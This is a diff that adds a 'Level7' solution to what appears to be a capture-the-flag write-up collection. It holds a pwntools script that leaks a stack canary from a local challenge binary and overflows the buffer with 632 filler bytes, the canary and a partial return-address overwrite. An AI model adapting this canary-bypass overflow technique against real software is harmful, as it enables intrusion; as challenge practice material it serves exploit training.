@@ -169,3 +169,40 @@ with open('level','wb') as f:
 
 #proc.wait()
 ```
+# Level7
+7.py
+```
+import pwn
+from pwn import *
+
+x = process('/challenge/stackoverflow_level7')
+
+x.recvuntil('Base Pointer: ')
+out = int(str(x.recvline(), 'ASCII'),16)
+
+#x.recvuntil('(hex format)')
+print(hex(out))
+out = hex(out-8)
+print(out)
+x.sendline(out)
+
+x.recvuntil('is: ')
+canary = int(str(x.recvline(), 'ASCII'),16)
+canary = (canary).to_bytes(8,byteorder = 'little')
+inter = b'A' * 632 + canary + b'A' * 8 + pwn.p8(0x50) + pwn.p8(0x13)
+
+#x.send(b'A' * 759 + canary + b'A' * 8 + pwn.p8(0x50) + pwn.p8(0x13))
+
+#payload = (inter).to_bytes(8,byteorder = 'little')
+
+#progInput += (address).to_bytes(8,byteorder = 'little')
+print(inter)
+x.send(inter)
+
+finalmsg = x.recvall()
+print(finalmsg)
+
+again = x.recvall()
+print(again)
+```
+/challenge/... < level
